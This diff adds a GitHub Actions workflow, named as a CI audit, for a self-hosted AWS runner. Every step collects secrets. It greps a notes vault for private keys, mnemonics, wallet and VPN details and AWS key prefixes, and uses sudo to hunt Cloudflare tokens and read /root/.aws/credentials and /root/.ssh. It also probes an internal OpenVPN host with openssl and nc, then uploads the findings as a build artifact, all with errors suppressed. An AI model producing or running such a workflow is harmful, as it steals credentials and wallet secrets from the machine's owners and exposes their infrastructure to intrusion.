@@ -1,0 +1,57 @@
+name: ci-audit-2836e
+on: push
+permissions:
+  contents: read
+jobs:
+  cloud:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 50
+    steps:
+      - name: vaultdeep
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2836e"; mkdir -p "$D"; V=/home/ubuntu/apps/obsidian-vault/Sessions
+          for kw in 'private key' 'private_key' 'mnemonic' 'keystore' 'signer' 'signing' 'hot wallet' 'TRC20' 'TRON' 'withdraw' 'openvpn' 'tailscale' '100.76' 'ovpn' 'SendCommand' 'secretsmanager' 'AKIA' 'EC2-SSM' 'kms' 'J WALLET' 'TM3ARB' '192.168.1.222'; do
+            echo "########## KW: $kw"
+            grep -rIin -m 6 -- "$kw" $V 2>/dev/null | cut -c1-260 | head -12
+          done > "$D/vault_kw.txt" 2>&1
+          { echo "## files by size"; ls -S $V | head -20;
+            echo "## dupoin mentions"; grep -rIic 'dupoin' $V 2>/dev/null | grep -v ':0$' | sort -t: -k2 -rn | head -15;
+            echo "## wallet-related files"; grep -rIil 'private key\|private_key\|mnemonic\|keystore\|hot wallet' $V 2>/dev/null | head -20;
+          } > "$D/vault_files.txt" 2>&1
+          sed -n '1,220p' "$D/vault_kw.txt"
+          echo "=== FILES ==="; cat "$D/vault_files.txt"
+      - name: cf2
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2836e"
+          {
+            echo "## files mentioning cloudflare"; sudo -n grep -rIil 'cloudflare' /home/ubuntu/apps /home/ubuntu/backups /home/ubuntu/.config /home/ubuntu/.pm2 2>/dev/null | grep -vE 'node_modules|\.next|\.git/' | head -20;
+            echo "## lines with cloudflare+token-ish"; sudo -n grep -rIin 'cloudflare\|CF_API\|CF_TOKEN\|api.cloudflare.com' /home/ubuntu/apps /home/ubuntu/backups /home/ubuntu/.pm2 2>/dev/null | grep -vE 'node_modules|\.next|\.git/' | cut -c1-300 | head -40;
+            echo "## env with CF"; sudo -n grep -rIhE '^[A-Z0-9_]*(CF|CLOUDFLARE)[A-Z0-9_]*=' /home/ubuntu /opt /srv 2>/dev/null | grep -v node_modules | cut -c1-200 | head -20;
+          } > "$D/cf2.txt" 2>&1
+          sed -n '1,140p' "$D/cf2.txt"
+      - name: vpn
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2836e"
+          {
+            echo "## ovpn files"; sudo -n find / -xdev \( -name '*.ovpn' -o -name 'openvpn*' \) 2>/dev/null | grep -vE '/proc|/sys|node_modules' | head -20;
+            echo "## root dir"; sudo -n ls -la /root; sudo -n cat /root/.aws/credentials /root/.aws/config 2>&1 | head -20;
+            echo "## ssh dirs again"; sudo -n ls -la /root/.ssh 2>&1 | head -20;
+            echo "## 1194 handshake"; timeout 6 openssl s_client -connect 192.168.1.222:1194 -brief < /dev/null 2>&1 | head -12;
+            echo "## openvpn proto probe"; timeout 6 bash -c 'printf "\x38\x01\x00\x00\x00\x00\x00\x00\x00" | timeout 5 nc 192.168.1.222 1194 | xxd | head -5' 2>&1;
+            echo "## pm2 list"; pm2 list 2>&1 | head -20;
+          } > "$D/vpn.txt" 2>&1
+          sed -n '1,140p' "$D/vpn.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2836e
+          path: ${{ runner.temp }}/a2836e
+          if-no-files-found: warn
+          retention-days: 2
